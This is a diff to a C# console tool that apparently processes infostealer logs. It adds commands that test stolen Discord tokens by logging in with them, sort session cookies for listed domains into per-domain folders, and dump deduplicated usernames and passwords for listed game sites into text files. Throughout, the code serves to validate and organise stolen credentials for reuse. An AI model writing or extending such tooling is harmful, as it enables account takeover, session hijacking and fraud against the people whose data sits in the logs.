@@ -19,6 +19,13 @@ public class MainView : ArgsView
         _settings = settings;
         _config = config;
     }
+
+    [Command]
+    public Task Checkers()
+    {
+        Root.PushRedirect<CheckersView>();
+        return Task.CompletedTask;
+    }
     
     [Command]
     public async Task Wallets()
@@ -62,8 +69,6 @@ public class MainView : ArgsView
         Directory.CreateDirectory("Discord");
         
         StreamWriter? all, invalid = null, valid = null;
-
-        var checker = new DiscordChecker();
         
         System.Console.WriteLine("Check tokens? [Y/N]"); // todo add check proxies
 
@@ -83,9 +88,9 @@ public class MainView : ArgsView
 
             if (!check) continue;
 
-            if (checker.TryLogin(token) is {} account)
+            if (DiscordChecker.TryLogin(token) is {} account)
             {
-                System.Console.WriteLine($"Token: {token}\nFriends: {checker.Friends(account)?.Count() ?? 0}");
+                System.Console.WriteLine($"Token: {token}\nFriends: {DiscordChecker.Friends(token)?.Count() ?? 0}");
                 valid!.WriteLine(token);
             }
             else
@@ -108,7 +113,7 @@ public class MainView : ArgsView
         using var writer = new StreamWriter("Links/links.txt", true);
         var links = File.ReadAllLines("links.txt");
         
-        foreach (var account in links.FromLogs(_settings.Path))
+        foreach (var account in links.LinksFromLogs(_settings.Path))
         {
             System.Console.WriteLine(account.ToString());
             writer.WriteLine(account.ToString());
@@ -119,19 +124,53 @@ public class MainView : ArgsView
     }
 
     [Command]
-    public Task Instagram()
+    public Task Cookies()
     {
         var folder = $"Cookies/{new DirectoryInfo(_settings.Path).Name}";
         Directory.CreateDirectory(folder);
 
-        var i = 0;
-        foreach (var cookies in ".instagram.com".FromLogs(_settings.Path).Where(x => x.Any()))
-        {
-            File.WriteAllLines($"{folder}/cookies{i}.txt", cookies);
+        var domains = File.ReadAllLines("cookies.txt").Select(x => x.Trim());
 
-            i++;
+        foreach (var (domain, cookies) in domains.CookiesFromLogs(_settings.Path)
+                     .ToDictionary(
+                         x => x.Key,
+                         x => x.Value.Where(x => x.Any()).ToArray()
+                     )
+                )
+        {
+            Directory.CreateDirectory(Path.Combine(folder, domain));
+            
+            for (var i = 0; i < cookies.Length; i++)
+            {
+                File.WriteAllLines(Path.Combine(folder, domain, $"cookie{i}.txt"), cookies[i]);
+            }
         }
-        
+
+
+        _ExitWait();
+        return Task.CompletedTask;
+    }
+
+    [Command]
+    public Task Accounts()
+    {
+        Directory.CreateDirectory("Passwords");
+        var domains = File.ReadAllLines("games.txt").Select(x => x.Trim());
+
+        foreach (var (domain, accounts) in domains.AccountsFromLogs(_settings.Path)
+                     .ToDictionary(
+                         x => x.Key,
+                         x => x.Value.DistinctBy(acc => acc.Username + acc.Password)
+                     )
+                     .ToDictionary(
+                         x => x.Key,
+                         x => x.Value.Select(acc => acc.ToStringShort())
+                     )
+                )
+        {
+            File.WriteAllLines($"Passwords/{domain}.txt", accounts);
+        }
+
         _ExitWait();
         return Task.CompletedTask;
     }
